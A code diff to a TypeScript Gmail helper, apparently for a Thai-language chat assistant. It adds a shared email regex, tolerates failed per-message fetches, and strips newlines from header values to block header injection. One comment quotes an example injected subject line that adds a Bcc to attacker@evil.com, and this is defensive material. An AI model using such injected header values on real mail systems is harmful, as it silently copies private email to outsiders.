@@ -11,6 +11,13 @@
 
 const GMAIL_BASE = "https://gmail.googleapis.com/gmail/v1/users/me";
 
+// Single source of truth for what counts as an email address here — both
+// gmailCommands.ts (direct chat command) and aiInterpreter.ts (validateIntent
+// for the AI-interpreted email_send intent) import this rather than each
+// keeping their own copy, so a future tightening/loosening can't silently
+// drift between the two entry points.
+export const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
 /** Thrown when the linked Google account's refresh token predates the
  * gmail.readonly/gmail.send scopes — the caller should prompt the user to
  * re-link. */
@@ -72,13 +79,35 @@ export async function listRecentEmails(
   const list = await gmailFetch(accessToken, `/messages?${listQuery}`);
   const ids: string[] = ((list.messages ?? []) as any[]).map((m) => m.id);
   const metaQuery = "format=metadata&metadataHeaders=From&metadataHeaders=Subject";
-  const messages = await Promise.all(ids.map((id) => gmailFetch(accessToken, `/messages/${id}?${metaQuery}`)));
+  // allSettled, not all: a message can vanish (deleted/archived) in the gap
+  // between the list() call above and this per-id get() — that single 404
+  // shouldn't take down the whole "เช็คอีเมล" reply and hide the other,
+  // perfectly fetchable unread messages behind a generic error instead.
+  const results = await Promise.allSettled(ids.map((id) => gmailFetch(accessToken, `/messages/${id}?${metaQuery}`)));
+  for (const r of results) {
+    if (r.status === "rejected") console.error("listRecentEmails: one message fetch failed, skipping it", r.reason);
+  }
+  const messages = results.filter((r): r is PromiseFulfilledResult<any> => r.status === "fulfilled").map((r) => r.value);
   return messages.map((m) => ({
     id: m.id,
     from: headerValue(m.payload?.headers, "From") || "(ไม่ทราบผู้ส่ง)",
     subject: headerValue(m.payload?.headers, "Subject") || "(ไม่มีหัวข้อ)",
     snippet: m.snippet ?? "",
   }));
+}
+
+// A header value (RFC 5322) is a single line — any \r or \n embedded in it
+// ends that line early and starts a new one, letting whatever comes after
+// be read as additional headers (a "Subject: hi\nBcc: attacker@evil.com"
+// draft becomes a real Bcc header on the sent message). Both call sites
+// validate `to` against EMAIL_RE (which already excludes whitespace) before
+// this ever runs, but `subject` is free-form user text, and gmailCommands.ts's
+// command parser deliberately uses a dotAll regex so a multi-line email body
+// can be typed — that same dotAll-ness lets a newline slip into the *subject*
+// capture too. Stripping breaks here, not just at the callers, so this stays
+// safe regardless of what future caller sends it a value.
+function stripHeaderBreaks(value: string): string {
+  return value.replace(/[\r\n]+/g, " ").trim();
 }
 
 // Header values must stay ASCII per RFC 5322 — a Thai subject line needs
@@ -102,8 +131,8 @@ function base64UrlFromBytes(bytes: Uint8Array): string {
 
 function buildRawMessage(to: string, subject: string, body: string): string {
   const lines = [
-    `To: ${to}`,
-    `Subject: ${encodeMimeHeaderValue(subject)}`,
+    `To: ${stripHeaderBreaks(to)}`,
+    `Subject: ${encodeMimeHeaderValue(stripHeaderBreaks(subject))}`,
     "MIME-Version: 1.0",
     'Content-Type: text/plain; charset="UTF-8"',
     "",
